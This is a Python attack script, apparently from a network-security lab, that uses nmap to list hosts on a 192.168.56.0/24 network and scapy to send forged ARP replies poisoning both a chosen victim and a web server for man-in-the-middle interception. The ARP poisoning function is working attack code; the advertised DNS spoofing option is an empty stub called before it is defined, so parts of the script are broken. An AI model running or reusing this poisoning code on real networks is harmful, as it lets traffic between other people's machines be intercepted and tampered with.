from scapy.all import *
from scapy.layers import *
import threading
import time
import socket
import nmap
import os
import sys
from getmac import get_mac_address

# Default variables
Net_Interface = "eth0" 
SERVER_IP = "192.168.56.102"
SERVER_MAC = '08:00:27:CC:08:6F'
ATTACKER_MAC = get_mac_address(interface=Net_Interface)

def arp(VICTIM_MAC, VICTIM_IP):
	print(ATTACKER_MAC)
	
		
				
	arp= Ether() / ARP()
	arp[Ether].src = ATTACKER_MAC
	arp[ARP].hwsrc = ATTACKER_MAC
	arp[ARP].psrc = SERVER_IP
	arp[ARP].hwdst = VICTIM_MAC
	arp[ARP].pdst = VICTIM_IP

	sendp(arp, iface=Net_Interface)

	#Poison the Linux Webserver
	arp= Ether() / ARP()
	arp[Ether].src = ATTACKER_MAC
	arp[ARP].hwsrc = ATTACKER_MAC
	arp[ARP].psrc = VICTIM_IP
	arp[ARP].hwdst = SERVER_MAC
	arp[ARP].pdst = SERVER_IP

	sendp(arp, iface=Net_Interface)

	poisonedIPs = [VICTIM_IP, SERVER_IP]
	print("(ARP) Re-poisoned the ARP of the following IPs: " + str(poisonedIPs));
	time.sleep(14)
    	
	return

print("Want to scan for all connected devices in the network? (Y/N)")
choice = input()
if choice == "y" or choice == "Y" or choice == "yes" or choice =="YES":
	#nm = nmap.PortScanner()
	#nm.scan("192.168.56.0", '20-1024')
	#print(scan_range['scan'])
	target = '192.168.56.0/24'
 
	scanner = nmap.PortScanner()
	scanner.scan(target, arguments='-sn', sudo=True)
 
	hosts = []
 
	for host in scanner.all_hosts():
		addresses = scanner[host]['addresses']
 
		hosts.append(addresses)
print('\n*** Hosts available to attack ***\n') 
print(hosts)
print("\n \nSet your Victim's IP Address")
VICTIM_IP = input()
print("\nSet your Victim's MAC Address (all capitals)")
VICTIM_MAC = input()


print("\nSelect attack to perform on Victim who hates ducks: \n")
print("1:	ARP Poisoning" )
print("2:	DNS Spoofing")
print("3:	ARP Poisoning & DNS Spoofing \n \n")
attack_to_perform = input()

if attack_to_perform == "1":
	arp(VICTIM_MAC, VICTIM_IP)
	
elif attack_to_perform == "2":
	dns()
	
elif attack_to_perform == "3":
	arp(VICTIM_MAC, VICTIM_IP)
	dns()



def dns():
	return


